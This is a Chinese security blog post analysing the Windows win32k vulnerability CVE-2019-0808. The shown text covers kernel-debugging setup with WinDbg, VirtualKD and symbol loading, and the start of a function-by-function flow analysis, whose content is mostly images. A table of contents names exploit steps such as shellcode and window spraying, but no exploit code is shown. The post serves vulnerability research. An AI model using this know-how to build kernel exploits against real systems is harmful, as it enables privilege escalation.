<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <title>CVE-2019-0808详细分析 | 大大黄的博客 | lahonja&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="theme-color" content="#3F51B5">
  
  
  <meta name="keywords" content="Windows,漏洞分析,CVE-2019-0808">
  <meta name="description" content="准备工作windbg调试本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=8279  点击下载DLL及">
<meta name="keywords" content="Windows,漏洞分析,CVE-2019-0808">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-0808详细分析">
<meta property="og:url" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/index.html">
<meta property="og:site_name" content="大大黄的博客">
<meta property="og:description" content="准备工作windbg调试本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=8279  点击下载DLL及">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/40.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/1.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/2.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/3.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/18.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/19.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/17.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/12.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/13.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/14.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/15.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/4.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/5.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/6.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/7.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/8.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/16.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/20.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/21.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/22.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/23.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/24.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/25.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/30.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/31.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/51.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/52.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/50.png">
<meta property="og:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/40.png">
<meta property="og:updated_time" content="2019-10-11T03:02:31.369Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-0808详细分析">
<meta name="twitter:description" content="准备工作windbg调试本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=8279  点击下载DLL及">
<meta name="twitter:image" content="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/40.png">
  
    <link rel="alternative" href="/atom.xml" title="大大黄的博客" type="application/atom+xml">
  
  <meta name="summary" content="&lt;h3 id=&#34;准备工作&#34;&gt;&lt;a href=&#34;#准备工作&#34; class=&#34;headerlink&#34; title=&#34;准备工作&#34;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;h4 id=&#34;windbg调试&#34;&gt;&lt;a href=&#34;#windbg调试&#34; class=&#34;headerlink&#34; title=&#34;windbg调试&#34;&gt;&lt;/a&gt;windbg调试&lt;/h4&gt;&lt;p&gt;本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。&lt;br&gt;下载地址：&lt;a href=&#34;https://www.microsoft.com/en-us/download/details.aspx?id=8279&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.microsoft.com/en-us/download/details.aspx?id=8279&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;cve-2019-0808.rar&#34;&gt;点击下载DLL及pdb、IDA注释文件&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;/2019/10/10/CVE-2019-0808详细分析/40.png&#34;&gt;

&lt;p&gt;win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :)  &lt;a href=&#34;https://bbs.pediy.com/thread-247019.htm&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;传送门&lt;/a&gt;&lt;br&gt;VirtualKD 中调试器路径选择自定义，地址为：&lt;/p&gt;
&lt;figure class=&#34;highlight taggerscript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:&lt;span class=&#34;symbol&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;symbol&#34;&gt;\j&lt;/span&gt;ack&lt;span class=&#34;symbol&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;symbol&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;symbol&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;symbol&#34;&gt;\W&lt;/span&gt;indowsApps&lt;span class=&#34;symbol&#34;&gt;\W&lt;/span&gt;inDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;注意不是windbg preview安装后的EXE目录：&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;selector-tag&#34;&gt;C&lt;/span&gt;:\&lt;span class=&#34;selector-tag&#34;&gt;Program&lt;/span&gt; &lt;span class=&#34;selector-tag&#34;&gt;Files&lt;/span&gt;\&lt;span class=&#34;selector-tag&#34;&gt;WindowsApps&lt;/span&gt;\&lt;span class=&#34;selector-tag&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.WinDbg_1&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.1910&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.3003&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.0_neutral__8wekyb3d8bbwe&lt;/span&gt;\&lt;span class=&#34;selector-tag&#34;&gt;DbgX&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.Shell&lt;/span&gt;&lt;span class=&#34;selector-class&#34;&gt;.exe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。&lt;/p&gt;
&lt;h4 id=&#34;开启内核调试&#34;&gt;&lt;a href=&#34;#开启内核调试&#34; class=&#34;headerlink&#34; title=&#34;开启内核调试&#34;&gt;&lt;/a&gt;开启内核调试&lt;/h4&gt;&lt;p&gt;首先在系统变量中设置符号表服务器系统变量：&lt;/p&gt;
&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;_NT_SYMBOL_PATH=SRV*C:\WINDOWS\Symbols*http://msdl.microsoft.com/download/symbols&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;进入kernel-mode debugging (kd&amp;gt; or lkd&amp;gt;)调试模式，首先命令行运行&lt;/p&gt;
&lt;figure class=&#34;highlight cmd&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bcdedit /debug on&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块：&lt;/p&gt;
&lt;figure class=&#34;highlight coq&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;WinDbg &lt;span class=&#34;keyword&#34;&gt;File&lt;/span&gt;&amp;gt;Kernel Debugging&amp;gt;&lt;span class=&#34;keyword&#34;&gt;Local&lt;/span&gt;&amp;gt;Ok&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;">
  <link rel="shortcut icon" href="/favicon.ico">
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="loading" class="active"></div>

  <nav id="menu" class="hide" >
   <div class="inner flex-row-vertical">
  <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
      <i class="icon icon-lg icon-close"></i>
  </a>
  <div class="brand-wrap">
    <div class="brand">
      <a href="/" class="avatar"><img src="/img/logo.jpg"></a>
      <hgroup class="introduce">
        <h5 class="nickname">LAHONJA</h5>
        <a href="mailto:634206017@qq.com" title="634206017@qq.com" class="mail">634206017@qq.com</a>
      </hgroup>
    </div>
  </div>
  <div class="scroll-wrap flex-col">
    <ul class="nav">
      
          <li class="waves-block waves-effect">
            <a href="/"  >
              <i class="icon icon-lg icon-home"></i>
              主页
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/archives"  >
              <i class="icon icon-lg icon-archives"></i>
              Archives
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/tags"  >
              <i class="icon icon-lg icon-tags"></i>
              Tags
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="https://github.com/yscoder" target="_blank" >
              <i class="icon icon-lg icon-github"></i>
              Github
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="http://www.weibo.com/ysweb" target="_blank" >
              <i class="icon icon-lg icon-weibo"></i>
              Weibo
            </a>
          </li>
      
          <li class="waves-block waves-effect">
            <a href="/404"  >
              <i class="icon icon-lg icon-link"></i>
              测试
            </a>
          </li>
      
    </ul>

    <footer class="footer">
  <p><a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0;vertical-align:middle;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAMAAABEF7i9AAAAllBMVEUAAAD///+rsapERER3d3eIiIjMzMzu7u4iIiKUmZO6v7rKzsoODg4RERFVVVUNDQ0NDg0PEA8zMzNLTEtbXltmZmZydnF9gn2AgICPkI+ZmZmqqqq7u7vFxsXIzMgNDQwZGRkgICAhISEkJSMnKCcuMC4xMzE5Ozk7PTtBQkFCQkJDQ0Nna2eGhoaHh4ezuLLGysbd3d1wVGpAAAAA4UlEQVR42q2T1xqCMAyFk7QsBQeKA9x7j/d/OSm22CpX0nzcpA1/T05aAOuBVkMAScQFHLnEwoCo2f1TnQIGoVMewjZEjVFN4GH1Ue1Cn2jWqwfsOOj6wDwGvotsl/c8lv7KIq1eLOsT0HMFHMIE/RZyHnlphryT9zyV+8WH5e8yQw3wnQvgAFxPTKUVi555SHR/lOfLMgVTeDlSfN+TaoUsiTyeIm+bCkHvCA2FUKG48LDtYBZBknsYP/G8NTw0gaaHyuQf4H5pecrB/FYCT2sL9zAfy1Xyjou6L8X2W7YcLyBZCRtnq/zfAAAAAElFTkSuQmCC" /></a></p>
  <p>大大黄的博客 &copy; 2020</p>
  <p>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
  <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></p>
  <a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-2x icon-rss-square"></i></a>
</footer>

  </div>
</div>

  </nav>
  <main id="main">
    <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">CVE-2019-0808详细分析</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input " autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-share">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header">
  <div class="container">
    <h1 class="author">CVE-2019-0808详细分析</h1>
    <h5 class="subtitle">
        
            <time datetime="2019-10-10T00:51:33.000Z" itemprop="datePublished" class="page-time">
  2019-10-10
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li></ul>

        
    </h5>
  </div>
</header>

    <div class="container body-wrap">
      <article id="post-CVE-2019-0808详细分析" 
  class="article article-type-post" itemprop="blogPost">
    <div class="post-meta flex-row">
        
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2019-0808/">CVE-2019-0808</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>

    </div>
    <div class="post-body">
        <aside class="post-widget" id="post-widget">

            
            <div class="post-share" id="post-share">
    <div class="tit">分享到：</div>
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
          豆
        </a>
      </li>
    </ul>
 </div>

            

            
            <nav class="post-toc-wrap" id="post-toc">
            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#准备工作"><span class="post-toc-number">1.</span> <span class="post-toc-text">准备工作</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#windbg调试"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">windbg调试</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#开启内核调试"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">开启内核调试</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#加载指定模块的符号"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">加载指定模块的符号</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#相关参考文档"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">相关参考文档</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反向流程分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">反向流程分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNSetGapState"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">xxxMNSetGapState</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNUpdateDraggingInfo"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">xxxMNUpdateDraggingInfo</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNMouseMove"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">xxxMNMouseMove</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxHandleMenuMessages"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">xxxHandleMenuMessages</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxCallHandleMenuMessages"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">xxxCallHandleMenuMessages</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNDragOver"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">xxxMNDragOver</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#NtUserMNDragOver"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">NtUserMNDragOver</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正向流程分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">正向流程分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#NtUserMNDragOver-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">NtUserMNDragOver</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNDragOver-1"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">xxxMNDragOver</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxCallHandleMenuMessages-1"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">xxxCallHandleMenuMessages</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxHandleMenuMessages-1"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">xxxHandleMenuMessages</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNMouseMove-1"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">xxxMNMouseMove</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNUpdateDraggingInfo-1"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">xxxMNUpdateDraggingInfo</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNSetGapState-1"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">xxxMNSetGapState</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP流程"><span class="post-toc-number">4.</span> <span class="post-toc-text">EXP流程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Shellcode"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Shellcode</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#进入ring0"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">进入ring0</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#lpfnWndProc中执行Shellcode"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">lpfnWndProc中执行Shellcode</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#调用HMValidateHandle获取tagWND"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">调用HMValidateHandle获取tagWND</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#窗口喷射"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">窗口喷射</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#xxxMNUpdateDraggingInfo条件构造"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">xxxMNUpdateDraggingInfo条件构造</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MNGetpItemFromIndex条件构造"><span class="post-toc-number">4.7.</span> <span class="post-toc-text">MNGetpItemFromIndex条件构造</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#条件构造代码"><span class="post-toc-number">4.8.</span> <span class="post-toc-text">条件构造代码</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#零页面内存分布"><span class="post-toc-number">4.9.</span> <span class="post-toc-text">零页面内存分布</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#MNGetpItem老版本"><span class="post-toc-number">4.10.</span> <span class="post-toc-text">MNGetpItem老版本</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#修改标识"><span class="post-toc-number">4.11.</span> <span class="post-toc-text">修改标识</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#整体流程"><span class="post-toc-number">4.12.</span> <span class="post-toc-text">整体流程</span></a></li></ol></li></ol>
            </nav>
            
        </aside>

        <div class="post-main">

            <div class="post-content" id="post-content" itemprop="postContent">
            <h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h4><p>本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。<br>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=8279" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=8279</a></p>
<blockquote>
<p><a href="cve-2019-0808.rar">点击下载DLL及pdb、IDA注释文件</a></p>
</blockquote>
<img src="/2019/10/10/CVE-2019-0808详细分析/40.png">

<p>win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :)  <a href="https://bbs.pediy.com/thread-247019.htm" target="_blank" rel="noopener">传送门</a><br>VirtualKD 中调试器路径选择自定义，地址为：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\j</span>ack<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indowsApps<span class="symbol">\W</span>inDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</span><br></pre></td></tr></table></figure>

<p>注意不是windbg preview安装后的EXE目录：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">Program</span> <span class="selector-tag">Files</span>\<span class="selector-tag">WindowsApps</span>\<span class="selector-tag">Microsoft</span><span class="selector-class">.WinDbg_1</span><span class="selector-class">.1910</span><span class="selector-class">.3003</span><span class="selector-class">.0_neutral__8wekyb3d8bbwe</span>\<span class="selector-tag">DbgX</span><span class="selector-class">.Shell</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<p>另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。</p>
<h4 id="开启内核调试"><a href="#开启内核调试" class="headerlink" title="开启内核调试"></a>开启内核调试</h4><p>首先在系统变量中设置符号表服务器系统变量：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_NT_SYMBOL_PATH=SRV*C:\WINDOWS\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure>

<p>进入kernel-mode debugging (kd&gt; or lkd&gt;)调试模式，首先命令行运行</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure>

<p>重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块：</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinDbg <span class="keyword">File</span>&gt;Kernel Debugging&gt;<span class="keyword">Local</span>&gt;Ok</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<img src="/2019/10/10/CVE-2019-0808详细分析/1.png">


<p>远程调试：<br>被调试机： .server tcp:port=5005<br>调试者机： tcp:Port=5005,Server=192.168.227.130</p>
<h4 id="加载指定模块的符号"><a href="#加载指定模块的符号" class="headerlink" title="加载指定模块的符号"></a>加载指定模块的符号</h4><p>lm 查看加载模块（win32k必须加载）<br>.reload 重新加载模块<br>!lmi win32k 查看win32k模块导入信息，pdb是否加载</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/2.png">

<p>ld win32k 或者 .reload /f win32k.sys 手工加载win32k模块的符号</p>
<p>x win32k!<em>DragOver</em> 以通配符搜索win32k模块中的符号</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/3.png">
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt win32k!tag*Menu*</span><br><span class="line">          win32k!tagMENUSTATE</span><br><span class="line">          win32k!tagMENU</span><br><span class="line">          win32k!tagPOPUPMENU</span><br><span class="line">          win32k!tagMENULIST</span><br><span class="line">          win32k!tagUAHMENUPOPUPMETRICS</span><br><span class="line">          win32k!tagUAHMENUITEMMETRICS</span><br></pre></td></tr></table></figure>

<h4 id="相关参考文档"><a href="#相关参考文档" class="headerlink" title="相关参考文档"></a>相关参考文档</h4><p>网上能够找到的较好的文章：<br><a href="https://www.cnblogs.com/goabout2/p/11255693.html" target="_blank" rel="noopener">关于EXP中构造条件的算法分析</a><br><a href="https://blog.exodusintel.com/2019/05/17/windows-within-windows/" target="_blank" rel="noopener">原作者exodusintel的分析</a><br><a href="https://www.4hou.com/vulnerable/18132.html" target="_blank" rel="noopener">原作者分析的翻译</a></p>
<p>研究人员通过补丁对比，发现<strong>Win32k!xxxMNSetGapState</strong>函数，可以在内核态下达到任意地址读写：</p>
<img src="/2019/10/10/CVE-2019-0808详细分析/18.png">

<h3 id="反向流程分析"><a href="#反向流程分析" class="headerlink" title="反向流程分析"></a>反向流程分析</h3><h4 id="xxxMNSetGapState"><a href="#xxxMNSetGapState" class="headerlink" title="xxxMNSetGapState"></a>xxxMNSetGapState</h4><img src="/2019/10/10/CVE-2019-0808详细分析/19.png">

<h4 id="xxxMNUpdateDraggingInfo"><a href="#xxxMNUpdateDraggingInfo" class="headerlink" title="xxxMNUpdateDraggingInfo"></a>xxxMNUpdateDraggingInfo</h4><img src="/2019/10/10/CVE-2019-0808详细分析/17.png">

<h4 id="xxxMNMouseMove"><a href="#xxxMNMouseMove" class="headerlink" title="xxxMNMouseMove"></a>xxxMNMouseMove</h4><img src="/2019/10/10/CVE-2019-0808详细分析/12.png">

